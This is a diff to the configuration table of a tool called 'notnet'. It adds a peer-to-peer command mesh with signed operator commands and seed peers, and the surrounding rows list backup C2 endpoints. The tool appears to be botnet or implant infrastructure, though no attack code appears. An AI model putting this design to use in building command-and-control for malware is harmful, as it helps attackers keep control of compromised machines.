@@ -271,6 +271,10 @@ Config is loaded from `/etc/notnet.conf` (key=value).
 | `relay_enabled` | `0` | Start relay at boot (requires token) |
 | `relay_port` | `1081` | Relay listen port |
 | `relay_token` | *(none)* | Relay client token; no default (or `NOTNET_RELAY_TOKEN`) |
+| `mesh_enabled` | `0` | Start the P2P command/peer mesh at boot (requires `relay_token` + operator pubkey) |
+| `mesh_port` | `1082` | Mesh listener port (accepts peer `MESH` frames) |
+| `mesh_operator_pubkey` | *(none)* | 64-hex ed25519 operator public key; commands are ed25519-signed and verified against it (fail-closed) |
+| `mesh_static_peers` | *(none)* | Up to `MESH_PEER_MAX` (16) seed peers, one per line as `host:port` |
 | `plugin_enabled` | `1` | Enable the plugin framework |
 | `byovd_guard` | `0` | BYOVD defense posture toggle (reporting only) |
 | `c2_backup_1`..`c2_backup_4` | *(none)* | Backup C2 endpoints (`host:port`, contiguous from 1) |
